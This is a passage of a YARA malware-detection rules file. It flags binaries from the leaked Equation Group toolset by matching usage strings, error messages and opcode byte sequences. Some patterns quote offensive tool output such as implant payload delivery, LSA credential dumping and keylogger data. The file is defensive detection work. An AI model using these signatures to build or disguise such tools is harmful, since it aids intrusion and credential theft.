     $s8 = \"NULLFILENAME\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 300KB and 3 of them)\n}\n\nrule EquationGroup_Toolset_Apr17_SetCallbackPorts\n{\n    meta:\n        description = \"EquationGroup Tool - April Leak\"\n        threat_names = \"Equation Group\"\n        ref = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_Toolset_Apr17_SetCallbackPorts\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"USAGE: %s <input file> <output file> <port1> [port2] [port3] [port4] [port5] [port6]\" fullword ascii\n        $s2 = \"You may enter between 1 and 6 ports to change the defaults.\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 100KB and 1 of them)\n}\n\nrule EquationGroup_Toolset_Apr17_DiBa_Target_BH_2000\n{\n    meta:\n        description = \"EquationGroup Tool - April Leak\"\n        threat_names = \"Equation Group\"\n        ref = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_Toolset_Apr17_DiBa_Target_BH_2000\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s2 = \"0M1U1Z1p1\" fullword ascii\n        $s14 = \"SPRQWV\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 2000KB and all of them)\n}\n\nrule EquationGroup_Toolset_Apr17_rc5\n{\n    meta:\n        description = \"EquationGroup Tool - April Leak\"\n        threat_names = \"Equation Group\"\n        ref = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_Toolset_Apr17_rc5\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"Usage: %s [d|e] session_key ciphertext\" fullword ascii\n        $s2 = \"where session_key and ciphertext are strings of hex\" fullword ascii\n        $s3 = \"d = decrypt mode, e = encrypt mode\" fullword ascii\n        $s4 = \"Bad mode, should be 'd' or 'e'\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 200KB and 2 of them)\n}\n\nrule EquationGroup_Toolset_Apr17_PC_Level_Generic\n{\n    meta:\n        description = \"EquationGroup Tool - April Leak\"\n        threat_names = \"Equation Group\"\n        ref = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_Toolset_Apr17_PC_Level_Generic\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"wshtcpip.WSHGetSocketInformation\" fullword ascii\n        $s2 = \"\\\\\\\\.\\\\%hs\" fullword ascii\n        $s3 = \".?AVResultIp@Mini_Mcl_Cmd_NetConnections@@\" fullword ascii\n        $s4 = \"Corporation. All rights reserved.\" fullword wide\n        $s5 = { 49 83 3c 24 00 75 02 eb 5d 49 8b 34 24 0f b7 46 }\n        $op1 = { 44 24 57 6f c6 44 24 58 6e c6 44 24 59 }\n        $op2 = { c6 44 24 56 64 88 5c 24 57 }\n        $op3 = { 44 24 6d 4c c6 44 24 6e 6f c6 44 24 6f }\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 400KB and (2 of ($s*) or all of ($op*))\n}\n\nrule EquationGroup_Toolset_Apr17_PC_Level3_http_exe\n{\n    meta:\n        description = \"EquationGroup Tool - April Leak\"\n        threat_names = \"Equation Group\"\n        ref = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_Toolset_Apr17_PC_Level3_http_exe\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"Copyright (C) Microsoft\" fullword wide\n        $op1 = { 24 39 65 c6 44 24 3a 6c c6 44 24 3b 65 c6 44 24 }\n        $op2 = { 44 24 4e 41 88 5c 24 4f ff }\n        $op3 = { 44 24 3f 6e c6 44 24 40 45 c6 44 24 41 }\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 400KB and all of them)\n}\n\nrule EquationGroup_Toolset_Apr17_ParseCapture\n{\n    meta:\n        description = \"EquationGroup Tool - April Leak\"\n        threat_names = \"Equation Group\"\n        ref = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_Toolset_Apr17_ParseCapture\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"* Encrypted log found.  An encryption key must be provided\" fullword ascii\n        $x2 = \"encryptionkey = e.g., \\\"00 11 22 33 44 55 66 77 88 99 aa bb cc dd ee ff\\\"\" fullword ascii\n        $x3 = \"Decrypting with key '%02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x'\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 50KB and 1 of them)\n}\n\nrule EquationGroup_Toolset_Apr17_ActiveDirectory_Target\n{\n    meta:\n        description = \"EquationGroup Tool - April Leak\"\n        threat_names = \"Equation Group\"\n        ref = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_Toolset_Apr17_ActiveDirectory_Target\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"(&(objectCategory=person)(objectClass=user)(cn=\" fullword wide\n        $s2 = \"(&(objectClass=user)(objectCategory=person)\" fullword wide\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 200KB and all of them)\n}\n\nrule EquationGroup_Toolset_Apr17_PC_Legacy_dll\n{\n    meta:\n        description = \"EquationGroup Tool - April Leak\"\n        threat_names = \"Equation Group\"\n        ref = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_Toolset_Apr17_PC_Legacy_dll\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $op1 = { 45 f4 65 c6 45 f5 6c c6 45 f6 33 c6 45 f7 32 c6 }\n        $op2 = { 49 c6 45 e1 73 c6 45 e2 57 c6 45 e3 }\n        $op3 = { 34 c6 45 e7 50 c6 45 e8 72 c6 45 e9 6f c6 45 ea }\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 200KB and all of them)\n}\n\nrule EquationGroup_Toolset_Apr17_svctouch\n{\n    meta:\n        description = \"EquationGroup Tool - April Leak\"\n        threat_names = \"Equation Group\"\n        ref = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_Toolset_Apr17_svctouch\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"Causes: Firewall,Machine down,DCOM disabled\\\\not supported,etc.\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 10KB and 1 of them)\n}\n\nrule EquationGroup_Toolset_Apr17_pwd_Implant\n{\n    meta:\n        description = \"EquationGroup Tool - April Leak\"\n        threat_names = \"Equation Group\"\n        ref = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_Toolset_Apr17_pwd_Implant\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"7\\\"7(7/7>7O7]7o7w7\" fullword ascii\n        $op1 = { 40 50 89 44 24 18 FF 15 34 20 00 }\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 20KB and 1 of them)\n}\n\nrule EquationGroup_Toolset_Apr17_KisuComms_Target_2000\n{\n    meta:\n        description = \"EquationGroup Tool - April Leak\"\n        threat_names = \"Equation Group\"\n        ref = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_Toolset_Apr17_KisuComms_Target_2000\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"363<3S3c3l3q3v3{3\" fullword ascii\n        $s2 = \"3!3%3)3-3135393@5\" fullword ascii\n        $op0 = { eb 03 89 46 54 47 83 ff 1a 0f 8c 40 ff ff ff 8b }\n        $op1 = { 8b 46 04 85 c0 74 0f 50 e8 34 fb ff ff 83 66 04 }\n        $op2 = { c6 45 fc 02 8d 8d 44 ff ff ff e8 d2 2f 00 00 eb }\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 200KB and (all of ($s*) or all of ($op*)))\n}\n\nrule EquationGroup_Toolset_Apr17_SlDecoder\n{\n    meta:\n        description = \"EquationGroup Tool - April Leak\"\n        threat_names = \"Equation Group\"\n        ref = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_Toolset_Apr17_SlDecoder\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"Error in conversion. SlDecoder.exe <input filename> <output filename> at command line \" fullword wide\n        $x2 = \"KeyLogger_Data\" fullword wide\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 200KB and 1 of them)\n}\n\nrule EquationGroup_Toolset_Apr17_Windows_Implant\n{\n    meta:\n        description = \"EquationGroup Tool - April Leak\"\n        threat_names = \"Equation Group\"\n        ref = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_Toolset_Apr17_Windows_Implant\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s2 = \"0#0)0/050;0M0Y0h0|0\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 50KB and all of them)\n}\n\nrule EquationGroup_Toolset_Apr17_msgkd_msslu64_msgki_mssld\n{\n    meta:\n        description = \"EquationGroup Tool - April Leak\"\n        threat_names = \"Equation Group\"\n        ref = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_Toolset_Apr17_msgkd_msslu64_msgki_mssld\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"PQRAPAQSTUVWARASATAUAVAW\" fullword ascii\n        $s2 = \"SQRUWVAWAVAUATASARAQAP\" fullword ascii\n        $s3 = \"iijymqp\" fullword ascii\n        $s4 = \"AWAVAUATASARAQI\" fullword ascii\n        $s5 = \"WARASATAUAVM\" fullword ascii\n        $op1 = { 0c 80 30 02 48 83 c2 01 49 83 e9 01 75 e1 c3 cc }\n        $op2 = { e8 10 66 0d 00 80 66 31 02 48 83 c2 02 49 83 e9 }\n        $op3 = { 48 b8 53 a5 e1 41 d4 f1 07 00 48 33 }\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 1000KB and 2 of ($s*) or all of ($op*))\n}\n\nrule EquationGroup_Toolset_Apr17_DoubleFeatureDll_dll_3\n{\n    meta:\n        description = \"EquationGroup Tool - April Leak\"\n        threat_names = \"Equation Group\"\n        ref = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_Toolset_Apr17_DoubleFeatureDll_dll_3\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $a = { f4 65 c6 45 f5 6c c6 45 f6 33 c6 45 f7 32 c6 45 }\n        $b = { 36 c6 45 e6 34 c6 45 e7 50 c6 45 e8 72 c6 45 e9 }\n        $c = { c6 45 e8 65 c6 45 e9 70 c6 45 ea 74 c6 45 eb 5f }\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 1000KB and all of them)\n}\n\nrule EquationGroup_Toolset_Apr17_SetCallback\n{\n    meta:\n        description = \"EquationGroup Tool - April Leak\"\n        threat_names = \"Equation Group\"\n        ref = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_Toolset_Apr17_SetCallback\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s2 = \"*NOTE: This version of SetCallback does not work with PeddleCheap versions prior\" fullword ascii\n        $s3 = \"USAGE: SetCallback <input file> <output file>\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 100KB and all of them)\n}\n\nrule EquationGroup_Toolset_Apr17__DoubleFeatureReader_DoubleFeatureReader_0\n{\n    meta:\n        description = \"EquationGroup Tool - April Leak\"\n        threat_names = \"Equation Group\"\n        ref = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_Toolset_Apr17__DoubleFeatureReader_DoubleFeatureReader_0\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"DFReader.exe logfile AESKey [-j] [-o outputfilename]\" fullword ascii\n        $x2 = \"Double Feature Target Version\" fullword ascii\n        $x3 = \"DoubleFeature Process ID\" fullword ascii\n        $op1 = { a1 30 21 41 00 89 85 d8 fc ff ff a1 34 21 41 00 }\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 300KB and 1 of them) or (2 of them)\n}\n\nrule EquationGroup_Toolset_Apr17__vtuner_vtuner_1\n{\n    meta:\n        description = \"EquationGroup Tool - April Leak\"\n        threat_names = \"Equation Group\"\n        ref = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_Toolset_Apr17__vtuner_vtuner_1\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"Unable to get -w hash.  %x\" fullword wide\n        $s2 = \"!\\\"invalid instruction mnemonic constant Id3vil\\\"\" fullword wide\n        $s4 = \"Unable to set -w provider. %x\" fullword wide\n        $op0 = { 2b c7 50 e8 3a 8c ff ff ff b6 c0 }\n        $op2 = { a1 8c 62 47 00 81 65 e0 ff ff ff 7f 03 d8 8b c1 }\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 2000KB and 2 of them)\n}\n\nrule EquationGroup_Toolset_Apr17__ecwi_ESKE_EVFR_RPC2_2\n{\n    meta:\n        description = \"EquationGroup Tool - April Leak\"\n        threat_names = \"Equation Group\"\n        ref = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_Toolset_Apr17__ecwi_ESKE_EVFR_RPC2_2\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"Target is share name\" fullword ascii\n        $s2 = \"Could not make UdpNetbios header -- bailing\" fullword ascii\n        $s3 = \"Request non-NT session key\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 2000KB and all of them)\n}\n\nrule EquationGroup_Toolset_Apr17__EAFU_ecwi_ESKE_EVFR_RPC2_4\n{\n    meta:\n        description = \"EquationGroup Tool - April Leak\"\n        threat_names = \"Equation Group\"\n        ref = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_Toolset_Apr17__EAFU_ecwi_ESKE_EVFR_RPC2_4\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"* Listening Post DLL %s() returned error code %d.\" fullword ascii\n        $s1 = \"WsaErrorTooManyProcesses\" fullword ascii\n        $s2 = \"NtErrorMoreProcessingRequired\" fullword ascii\n        $s3 = \"Connection closed by remote host (TCP Ack/Fin)\" fullword ascii\n        $s4 = \"ServerErrorBadNamePassword\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 2000KB and all of ($s*) or 1 of ($x*))\n}\n\nrule EquationGroup_Toolset_Apr17__SendCFTrigger_SendPKTrigger_6\n{\n    meta:\n        description = \"EquationGroup Tool - April Leak\"\n        threat_names = \"Equation Group\"\n        ref = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_Toolset_Apr17__SendCFTrigger_SendPKTrigger_6\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s4 = \"* Failed to connect to destination - %u\" fullword wide\n        $s6 = \"* Failed to convert destination address into sockaddr_storage values\" fullword wide\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 400KB and 1 of them)\n}\n\nrule EquationGroup_Toolset_Apr17__AddResource\n{\n    meta:\n        description = \"EquationGroup Tool - April Leak\"\n        threat_names = \"Equation Group\"\n        ref = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_Toolset_Apr17__AddResource\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"%s cm 10 2000 \\\"c:\\\\MY DIR\\\\myapp.exe\\\" c:\\\\MyResourceData.dat\" fullword ascii\n        $s2 = \"<PE path> - the path to the PE binary to which to add the resource.\" fullword ascii\n        $s3 = \"Unable to get path for target binary.\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 300KB and 2 of them)\n}\n\nrule EquationGroup_Toolset_Apr17__ESKE_RPC2_8\n{\n    meta:\n        description = \"EquationGroup Tool - April Leak\"\n        threat_names = \"Equation Group\"\n        ref = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_Toolset_Apr17__ESKE_RPC2_8\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s4 = \"Fragment: Packet too small to contain RPC header\" fullword ascii\n        $s5 = \"Fragment pickup: SmbNtReadX failed\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 700KB and 1 of them)\n}\n\nrule EquationGroup_Toolset_Apr17__LSADUMP_Lp_ModifyPrivilege_Lp_PacketScan_Lp_put_Lp_RemoteExecute_Lp_Windows_Lp_wmi_Lp_9\n{\n    meta:\n        description = \"EquationGroup Tool - April Leak\"\n        threat_names = \"Equation Group\"\n        ref = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_Toolset_Apr17__LSADUMP_Lp_ModifyPrivilege_Lp_PacketScan_Lp_put_Lp_RemoteExecute_Lp_Windows_Lp_wmi_Lp_9\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"Injection Lib -  \" wide\n        $x2 = \"LSADUMP - - ERROR\" wide\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 300KB and 1 of them)\n}\n\nrule EquationGroup_Toolset_Apr17__ETBL_ETRE_10\n{\n    meta:\n        description = \"EquationGroup Tool - April Leak\"\n        threat_names = \"Equation Group\"\n        ref = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_Toolset_Apr17__ETBL_ETRE_10\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"Probe #2 usage: %s -i TargetIp -p TargetPort -r %d [-o TimeOut] -t Protocol -n IMailUserName -a IMailPassword\" fullword ascii\n        $x6 = \"** RunExploit ** - EXCEPTION_EXECUTE_HANDLER : 0x%08X\" fullword ascii\n        $s19 = \"Sending Implant Payload.. cEncImplantPayload size(%d)\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 200KB and 1 of them)\n}\n\nrule EquationGroup_Toolset_Apr17__ELV_ESKE_ETBL_ETRE_EVFR_11\n{\n    meta:\n        description = \"EquationGroup Tool - April Leak\"\n        threat_names = \"Equation Group\"\n        ref = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_Toolset_Apr17__ELV_ESKE_ETBL_ETRE_EVFR_11\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"Target is vulnerable\" fullword ascii\n        $x2 = \"Target is NOT vulnerable\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 2000KB and 1 of them)\n}\n\nrule EquationGroup_Toolset_Apr17__ELV_ESKE_EVFR_RideArea2_12\n{\n    meta:\n        description = \"EquationGroup Tool - April Leak\"\n        threat_names = \"Equation Group\"\n        ref = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_Toolset_Apr17__ELV_ESKE_EVFR_RideArea2_12\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x2 = \"** CreatePayload ** - EXCEPTION_EXECUTE_HANDLER\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 2000KB and all of them)\n}\n\nrule EquationGroup_Toolset_Apr17__ELV_ESKE_13\n{\n    meta:\n        description = \"EquationGroup Tool - April Leak\"\n        threat_names = \"Equation Group\"\n        ref = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_Toolset_Apr17__ELV_ESKE_13\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"Skip call to PackageRideArea().  Payload has already been packaged. Options -x and -q ignored.\" fullword ascii\n        $s2 = \"ERROR: pGvars->pIntRideAreaImplantPayload is NULL\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 600KB and 1 of them)\n}\n\nrule EquationGroup_Toolset_Apr17__NameProbe_SMBTOUCH_14\n{\n    meta:\n        description = \"EquationGroup Tool - April Leak\"\n        threat_names = \"Equation Group\"\n        ref = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_Toolset_Apr17__NameProbe_SMBTOUCH_14\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"DEC Pathworks TCPIP service on Windows NT\" fullword ascii\n        $s2 = \"<\\\\\\\\__MSBROWSE__> G\" fullword ascii\n        $s3 = \"<IRISNAMESERVER>\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 300KB and all of them)\n}\n\nrule EquationGroup_Toolset_Apr17__ELV_ESKE_EVFR_RPC2_15\n{\n    meta:\n        description = \"EquationGroup Tool - April Leak\"\n        threat_names = \"Equation Group\"\n        ref = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_Toolset_Apr17__ELV_ESKE_EVFR_RPC2_15\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"** SendAndReceive ** - EXCEPTION_EXECUTE_HANDLER\" 